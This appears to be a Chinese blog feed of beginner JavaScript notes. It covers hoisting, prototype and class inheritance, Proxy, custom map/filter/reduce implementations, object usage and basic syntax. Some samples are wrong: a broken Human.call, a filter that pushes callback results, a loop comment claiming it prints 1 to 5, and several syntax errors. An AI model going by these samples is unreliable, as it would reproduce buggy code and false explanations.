<p>在全局作用域下声明let和const不会被挂载到window上，再者如果我们在声明了a之前使用了a，会报错。报错的原因是存在暂时性死区，我们不能在声明前就使用一个变量。那么为什么会存在变量提升这个事情呢？其实它的存在是为了解决函数间互相调用的情况。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test1() &#123;</span><br><span class="line">    test2()</span><br><span class="line">&#125;</span><br><span class="line">function test2() &#123;</span><br><span class="line">    test1()</span><br><span class="line">&#125;</span><br><span class="line">test1()</span><br></pre></td></tr></table></figure></p>
<p>假如不存在提升这个情况，那么就实现不了上述的代码，因为不可能存在 test1 在 test2 前面然后 test2 又在 test1 前面。</p>
<p>总结几点：</p>
<ol>
<li>函数提升优于变量提升，函数提升会把整个函数挪到作用域顶部，变量提升只会把声明挪到作用域顶部；</li>
<li>var存在提升，我们可以在声明之前使用；let和const存在暂时性死区，不能在声明前使用；</li>
<li>var在全局作用域下声明变量会导致变量挂载到window上，其他两者不会；</li>
<li>let和const的作用基本一致，但const声明的变量不能被再次赋值；</li>
</ol>
<h3 id="原型继承-amp-amp-ES6的Class继承"><a href="#原型继承-amp-amp-ES6的Class继承" class="headerlink" title="原型继承&amp;&amp;ES6的Class继承"></a>原型继承&amp;&amp;ES6的Class继承</h3><ol>
<li><p>原型继承</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">子类：</span><br><span class="line">function Human(name) &#123;</span><br><span class="line">    this.name = name  // 自有属性</span><br><span class="line">&#125;</span><br><span class="line">Human.prototype.run = function() &#123;  // 原型上的共有属性</span><br><span class="line">    console.log(&quot;我叫&quot; + this.name + &quot;，我在跑步&quot;)</span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">孙类：</span><br><span class="line">function Man(name) &#123;</span><br><span class="line">    Human.call(this.name)  // ①调用，即call一下父类</span><br><span class="line">    this.gender = &apos;男&apos;  // 自有属性</span><br><span class="line">&#125;</span><br><span class="line">Man.prototype.__proto__ = Human.prototype  // ②将Man的原型链到Human的原型上</span><br><span class="line">Man.prototype.fight = function() &#123;</span><br><span class="line">    console.log(&apos;捶你胸口&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Class继承</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Human &#123;</span><br><span class="line">    constructor(name) &#123;</span><br><span class="line">        this.name = name  // 自有属性</span><br><span class="line">    &#125;</span><br><span class="line">    run() &#123;  // 公有属性，直接写在prototype即原型链上</span><br><span class="line">        console.log(&quot;我叫&quot; + this.name + &quot;，我在跑步&quot;);</span><br><span class="line">        return undefined</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Man extends Human &#123;  // 等价于 Man.prototype.__proto__ = Human.prototype</span><br><span class="line">    constructor(name) &#123;</span><br><span class="line">        super(name)  // 调用父类，等价于Human.call(this,name)，使子类拥有this.name = name</span><br><span class="line">        this.gender = &apos;男&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    fight() &#123;</span><br><span class="line">        console.log(&apos;捶你&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>class 实现继承的核心在于使用 extends 表明继承自哪个父类，并且在子类构造函数中必须调用 super，因为这段代码可以看成 Parent.call(this, value)，但JS中并不存在类，所以 class 的本质就是函数</p>
<h3 id="模块化（待补充）"><a href="#模块化（待补充）" class="headerlink" title="模块化（待补充）"></a>模块化（待补充）</h3><h3 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h3><p>在Vue3.0中，将通过proxy替代原本的Object.defineProperty来实现数据响应式，Proxy是ES6中的新增功能，它可以用来自定义对象中的操作<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let p = new Proxy(target,handler)  // target 代表需要添加代理的对象，handler 用来自定义对象中的操作，比如可以用来自定义 set 或者 get 函数。</span><br></pre></td></tr></table></figure></p>
<p>下面通过Proxy来实现一个数据响应式<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let onWatch = (obj, setBind, getLogger) =&gt; &#123;</span><br><span class="line">  let handler = &#123;</span><br><span class="line">    get(target, property, receiver) &#123;</span><br><span class="line">      getLogger(target, property)</span><br><span class="line">      return Reflect.get(target, property, receiver)</span><br><span class="line">    &#125;,</span><br><span class="line">    set(target, property, value, receiver) &#123;</span><br><span class="line">      setBind(value, property)</span><br><span class="line">      return Reflect.set(target, property, value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return new Proxy(obj, handler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let obj = &#123; a: 1 &#125;</span><br><span class="line">let p = onWatch(</span><br><span class="line">  obj,</span><br><span class="line">  (v, property) =&gt; &#123;</span><br><span class="line">    console.log(`监听到属性$&#123;property&#125;改变为$&#123;v&#125;`)</span><br><span class="line">  &#125;,</span><br><span class="line">  (target, property) =&gt; &#123;</span><br><span class="line">    console.log(`&apos;$&#123;property&#125;&apos; = $&#123;target[property]&#125;`)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line">p.a = 2 // 监听到属性a改变</span><br><span class="line">p.a // &apos;a&apos; = 2</span><br></pre></td></tr></table></figure></p>
<p>我们通过自定义 set 和 get 函数的方式，在原本的逻辑中插入了我们的函数逻辑，实现了在对对象任何属性进行读写时发出通知。</p>
<p>如果需要实现一个 Vue 中的响应式，需要在 get 中收集依赖，set 派发更新，之所以要使用 Proxy 替换原本的 API 原因在于 Proxy 无需一层层递归为每个属性添加代理，一次即可完成以上操作，性能上更好，并且原本的实现有一些数据更新不能监听到，但是 Proxy 可以完美监听到任何方式的数据改变，唯一缺陷是浏览器兼容不好。</p>
<h3 id="map、filter、reduce"><a href="#map、filter、reduce" class="headerlink" title="map、filter、reduce"></a>map、filter、reduce</h3><ol>
<li>map 作用是生成一个新数组，遍历原数组，将每个元素拿出来做一些变化然后放入到新的数组中。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">[1, 2, 3].map(v =&gt; v + 1) // -&gt; [2, 3, 4]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>实现原理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array.prototype.map = function(fn)&#123;</span><br><span class="line">    let result = [];</span><br><span class="line">    for(let i=0; i &lt; this.length; i++) &#123;</span><br><span class="line">        if(i in this) &#123;</span><br><span class="line">            result[i] = fn.call(undefined,this[i],i,this)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol start="2">
<li>filter 有条件地放入map，是真值就push进去，不是真值就不push<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">a = [1,2,3,4,5]</span><br><span class="line">a.filter( (value) =&gt; &#123;return value % 2 === 0&#125;)  // [2,4]</span><br><span class="line">a.filter( (value) =&gt; &#123;return value % 2 !== 0&#125;)  // [1,3,5]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>实现原理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array.prototype.filter = function(fn)&#123;</span><br><span class="line">    let result = [];</span><br><span class="line">    let temp;</span><br><span class="line">    for(let i = 0; i&lt;this.length; i++) &#123;</span><br><span class="line">        if(i in this) &#123;</span><br><span class="line">            if(temp = fn.call(undefined,this[i],i,this))&#123;</span><br><span class="line">                result.push(temp)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol start="3">
<li>reduce 可以将数组中的元素通过回调函数最终转换为一个值<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">如果我们想实现一个功能将函数里的元素全部相加得到一个值，可能会这样写代码：</span><br><span class="line">const arr = [1, 2, 3]</span><br><span class="line">let total = 0</span><br><span class="line">for (let i = 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">  total += arr[i]</span><br><span class="line">&#125;</span><br><span class="line">console.log(total) //6 </span><br><span class="line"></span><br><span class="line">如果用reduce可以一行实现：</span><br><span class="line">const arr = [1, 2, 3]</span><br><span class="line">const sum = arr.reduce((acc, current) =&gt; acc + current, 0)</span><br><span class="line">console.log(sum)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>reduce 接受两个参数，分别是回调函数和初始值</p>
<ul>
<li>首先初始值为 0，该值会在执行第一次回调函数时作为第一个参数传入；</li>
<li>回调函数接受四个参数，分别为累计值、当前元素、当前索引、原数组；</li>
<li>在一次执行回调函数时，当前值和初始值相加得出结果 1，该结果会在第二次执行回调函数时当做第一个参数传入；</li>
<li>所以在第二次执行回调函数时，相加的值就分别是 1 和 2，以此类推，循环结束后得到结果 6；</li>
</ul>
<p>实现原理：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array.prototype.reduce = function(fn,init) &#123;</span><br><span class="line">    let result = init;</span><br><span class="line">    for(let i = 0; i &lt; this.length; i++)&#123;</span><br><span class="line">        if(i in this) &#123;</span><br><span class="line">            result = fn.call(undefined,result,this[i],i,this)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol start="4">
<li>用reduce实现map和filter<br>reduce -&gt; map<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array2 = array.map( (v) =&gt; v+1)  // 给数组每一项加1</span><br><span class="line"></span><br><span class="line">可以写成：</span><br><span class="line">array2 = array.reduce( (result,v) =&gt; &#123;</span><br><span class="line">    result.push(v+1);</span><br><span class="line">    return result</span><br><span class="line">&#125;, [])</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>reduce  -&gt; filter<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array2 = array.filter( (v) =&gt; v%2 === 0)</span><br><span class="line"></span><br><span class="line">可以写成：</span><br><span class="line">array2 = array.reduce( (result,v) =&gt; &#123;</span><br><span class="line">    if( v%2 === 0) &#123;</span><br><span class="line">        result.push(v)</span><br><span class="line">    &#125;</span><br><span class="line">    return result</span><br><span class="line">&#125;, [])</span><br></pre></td></tr></table></figure></p>
]]></content>
  </entry>
  <entry>
    <title>JS对象基本用法</title>
    <url>/2022/03/14/JS%E5%AF%B9%E8%B1%A1%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="如何声明对象"><a href="#如何声明对象" class="headerlink" title="如何声明对象"></a>如何声明对象</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="string">'name'</span>: <span class="string">'frank'</span>, <span class="string">'age'</span>: <span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123; <span class="string">'name'</span>:<span class="string">'frank'</span>, <span class="string">'age'</span>: <span class="number">18</span>&#125;)</span><br></pre></td></tr></table></figure>
<ol>
<li>键名是字符串，不是标识符，可以包含任意字符</li>
<li>引号可以省略，省略之后就只能写标识符</li>
<li>就算引号省略，键名key永远都是字符串</li>
</ol>
<h2 id="删除对象的属性"><a href="#删除对象的属性" class="headerlink" title="删除对象的属性"></a>删除对象的属性</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> obj[<span class="string">'name'</span>]  <span class="comment">// 新手推荐写法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> obj.name</span><br></pre></td></tr></table></figure>
<p>注意区分’不含属性名’和’属性值为undefined’<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;  <span class="comment">// 不含属性xxx</span></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;<span class="string">'xxx'</span>: <span class="literal">undefined</span>&#125;  <span class="comment">// 含属性xxx，但值为undefined</span></span><br><span class="line"></span><br><span class="line">obj.xxx === <span class="literal">undefined</span>  <span class="comment">// true</span></span><br><span class="line">obj2.xxx === <span class="literal">undefined</span>  <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="string">'xxx'</span> <span class="keyword">in</span> obj  <span class="comment">// false</span></span><br><span class="line"><span class="string">'xxx'</span> <span class="keyword">in</span> obj2  <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">obj.xxx === <span class="literal">undefined</span> 不能断定 <span class="string">'xxx'</span> 是否为obj的属性</span><br><span class="line"></span><br><span class="line">应该使用<span class="string">'xxx'</span> <span class="keyword">in</span> obj</span><br></pre></td></tr></table></figure></p>
<h2 id="查看对象属性"><a href="#查看对象属性" class="headerlink" title="查看对象属性"></a>查看对象属性</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查看自身属性</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(obj)  <span class="comment">// 自身属性</span></span><br><span class="line"><span class="built_in">Object</span>.values(obj)  <span class="comment">// 自身属性值</span></span><br><span class="line"><span class="built_in">Object</span>.entries(obj)  <span class="comment">// 查看所有属性及属性值，返回键值对数组</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查看自身属性+共有属性</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.dir(obj)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断一个属性是否是自身属性</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">'name'</span>: <span class="string">'joyce'</span>, <span class="string">'age'</span>: <span class="number">25</span>, <span class="string">'gender'</span>: <span class="string">'women'</span>&#125;</span><br><span class="line"></span><br><span class="line">obj.hasOwnProperty(<span class="string">'toString'</span>)  <span class="comment">// false</span></span><br><span class="line">obj.hasOwnProperty(<span class="string">'name'</span>)  <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看'name'属性是否在obj中，但不能断定是obj的自身属性还是共有属性</span></span><br><span class="line"><span class="string">'name'</span> <span class="keyword">in</span> obj <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查看obj的一个属性</span></span><br><span class="line"></span><br><span class="line">obj.name</span><br><span class="line">obj[<span class="string">'name'</span>]  <span class="comment">// 两种写法均可，新手推荐第二种，键名是字符串而不是变量，新手容易与obj[name]混淆</span></span><br></pre></td></tr></table></figure>
<h2 id="修改或增加对象属性"><a href="#修改或增加对象属性" class="headerlink" title="修改或增加对象属性"></a>修改或增加对象属性</h2><ul>
<li><p>修改或增加自身属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单个赋值</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">'name'</span>: <span class="string">'joyce'</span>&#125;</span><br><span class="line">obj.age = <span class="number">25</span></span><br><span class="line">obj[<span class="string">'hobby'</span>] = cooking</span><br><span class="line"></span><br><span class="line"><span class="comment">// 批量赋值</span></span><br><span class="line"><span class="built_in">Object</span>.assign(obj, &#123;<span class="string">'age'</span>: <span class="number">25</span>, <span class="string">'hobby'</span>: <span class="string">'cooking'</span>&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改或增加共有属性(原型)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> common = &#123;<span class="string">'nation'</span>:<span class="string">'China'</span>, <span class="string">'hair'</span>:<span class="string">'brown'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = <span class="built_in">Object</span>.create(common)  <span class="comment">// 以common为原型创建person</span></span><br><span class="line"><span class="built_in">Object</span>.assign(person, &#123;  <span class="comment">// 批量给person增加属性</span></span><br><span class="line">    <span class="string">'name'</span> :<span class="string">'joyce'</span>,</span><br><span class="line">    <span class="string">'age'</span> : <span class="number">25</span>,</span><br><span class="line">    <span class="string">'hobby'</span> : <span class="string">'cooking'</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改或增加共有属性（原型）的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.__proto__.toString = <span class="string">'yyy'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString = <span class="string">'yyy'</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>JS基本语法</title>
    <url>/2022/03/13/JS%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="表达式与语句"><a href="#表达式与语句" class="headerlink" title="表达式与语句"></a>表达式与语句</h2><ul>
<li>表达式（expression），指一个为了得到返回值的计算式</li>
</ul>
<ol>
<li>1+2表达式的值为3</li>
<li>add(1,2)表达式的值为函数的返回值</li>
<li>console.log表达式的值为函数本身</li>
<li>console.log(3)表达式的值为undefined，3是控制台打印出来的</li>
</ol>
<ul>
<li>语句（statement）是为了完成某种任务而进行的操作，下面是两行赋值语句。语句以分号结尾，一个分号就表示一个语句结束，多个语句可以写在一行内。</li>
</ul>
<ol>
<li>var a = 1; </li>
<li>var b = ‘abc’;</li>
</ol>
<ul>
<li>语句和表达式的区别</li>
</ul>
<ol>
<li>语句主要为了进行某种操作，一般情况下不需要返回值</li>
<li>表达式是为了得到返回值，一定会返回一个值</li>
<li>语句一般会改变环境（声明、赋值）</li>
</ol>
<hr>
<h2 id="大小写敏感"><a href="#大小写敏感" class="headerlink" title="大小写敏感"></a>大小写敏感</h2><ul>
<li>var a 与 var A 是不同的</li>
<li>object 与 Object 是不同的</li>
</ul>
<hr>
<h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><ul>
<li>大部分空格没有实际意义</li>
<li>加回车大部分时候也不影响，只有在<strong>return</strong>后面不能加回车</li>
</ul>
<p><img src="https://s2.loli.net/2022/03/13/Q5X7VzRblZKP61f.png" alt="WechatIMG2334.png"></p>
<hr>
<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><ul>
<li>第一个字符，可以是unicode字母 $ _ 中文（但不可以以数字开头）</li>
<li>变量名是标识符<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _ = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> $ = <span class="number">2</span></span><br><span class="line"><span class="keyword">var</span> _____ = <span class="number">6</span></span><br><span class="line"><span class="keyword">var</span> 你好 = ‘hi’</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="区块block"><a href="#区块block" class="headerlink" title="区块block"></a>区块block</h2><p>将代码包裹在一起，且常与if/for/while合用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">let</span> b = <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><ul>
<li>语法</li>
</ul>
<ol>
<li>if(表达式) {语句1}else{语句2}</li>
<li>{}在语句只有一句的时候可以省略，但不建议这样做</li>
</ol>
<ul>
<li>变态情况</li>
</ul>
<ol>
<li>表达式里可以很变态，如 a = 1</li>
<li>语句1里可以非常变态，如嵌套if else</li>
<li>语句2里可以非常变态，如嵌套 if else</li>
<li>缩进也可以很变态，如面试题常常下套<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(a = <span class="number">1</span>)&#123; <span class="comment">// a = 1，指将1赋值给a </span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'a是1'</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'a不是1'</span>)</span><br><span class="line">    <span class="comment">// 会打印出 a是1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span>(a === <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'a'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'a等于2'</span>)</span><br><span class="line">    <span class="comment">// 会打印出 a等于2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span>(a === <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'a'</span>); <span class="built_in">console</span>.log(<span class="string">'b'</span>)</span><br><span class="line">    <span class="comment">// 会打印出b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span>(a === <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'a'</span>),<span class="built_in">console</span>.log(<span class="string">'b'</span>)</span><br><span class="line">    <span class="comment">// 什么也不打印</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>推荐写法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式) &#123;</span><br><span class="line">    语句<span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(表达式)&#123;</span><br><span class="line">    语句<span class="number">2</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    语句<span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>次推荐写法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(表达式) &#123;</span><br><span class="line">        <span class="keyword">return</span> 表达式</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(表达式) &#123;</span><br><span class="line">        <span class="keyword">return</span> 表达式</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> 表达式</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (fruit)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"banana"</span>:</span><br><span class="line">        执行语句<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span>:<span class="string">"apple"</span>:</span><br><span class="line">        执行语句<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        执行语句<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据变量fruit的值，选择执行相应的case。如果所有case都不符合，则执行最后的default部分</span></span><br><span class="line"><span class="comment">// 不要省略break，否则不会退出switch，并且会继续执行下一个case</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="问号冒号表达式"><a href="#问号冒号表达式" class="headerlink" title="问号冒号表达式"></a>问号冒号表达式</h2><p>语法：条件? 表达式1:表达式2<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> even = (n % <span class="number">2</span> === <span class="number">0</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br></pre></td></tr></table></figure></p>
<p>等同于<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> even;</span><br><span class="line"><span class="keyword">if</span>(n % <span class="number">2</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    even = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    even = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可视为if…else…的简写形式<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> msg = <span class="string">'数字'</span> + n + <span class="string">'是'</span> + (n%<span class="number">2</span> === <span class="number">0</span> ? <span class="string">'偶数'</span> : <span class="string">'奇数'</span>);</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="amp-amp-短路逻辑"><a href="#amp-amp-短路逻辑" class="headerlink" title="&amp;&amp;短路逻辑"></a>&amp;&amp;短路逻辑</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.f1 &amp;&amp; <span class="built_in">console</span>.log(<span class="string">'f1存在'</span>);</span><br><span class="line"></span><br><span class="line">等价于</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.f1)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'f1存在'</span>);</span><br><span class="line">&#125; <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fn &amp;&amp; fn() <span class="comment">// 表示fn若存在，就调用fn()</span></span><br><span class="line"></span><br><span class="line">等价于</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fn) &#123;</span><br><span class="line">    fn();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>‘A &amp;&amp; B’: 若A为真，就执行B，若A为假，就不执行后面的</li>
<li>‘A &amp;&amp; B &amp;&amp; C &amp;&amp; D’: 取第一个假值或D</li>
</ul>
<hr>
<h2 id="短路逻辑"><a href="#短路逻辑" class="headerlink" title="||短路逻辑"></a>||短路逻辑</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a || b</span><br><span class="line"></span><br><span class="line">等价于</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !a )&#123;</span><br><span class="line">    b</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>常常用于给a设定一个兜底值</strong><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = a || <span class="number">100</span></span><br><span class="line"></span><br><span class="line">等价于</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a)&#123;</span><br><span class="line">    a = a</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>&#123;</span><br><span class="line">    a = <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">等价于</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!a) &#123;  <span class="comment">// 若a不存在，就给a赋值为100</span></span><br><span class="line">    a = <span class="number">100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>语法： while(条件){语句};</p>
<p>包括一个循环条件和一段代码块，只要条件为真，就不断循环执行代码块。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (i&lt;<span class="number">10</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'i当前为'</span> + i);</span><br><span class="line">    i = i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">0.1</span></span><br><span class="line"><span class="keyword">while</span>(a ! == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a)</span><br><span class="line">    a = a + <span class="number">0.1</span></span><br><span class="line">&#125;  <span class="comment">//  由于浮点数的问题，会死循环</span></span><br></pre></td></tr></table></figure>
<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for语句是循环命令的另一种形式（while循环的方便写法），可以指定循环的起点、终点和终止条件。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125; <span class="comment">// 打印出 1 2 3 4 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">101</span>; j&lt;<span class="number">100</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i===<span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;  <span class="comment">// 打印出0，1,2,3,4,5,6,7,8,9  break只会退出距离它最近的for循环，外面的for循环中的i会执行完</span></span><br></pre></td></tr></table></figure></p>
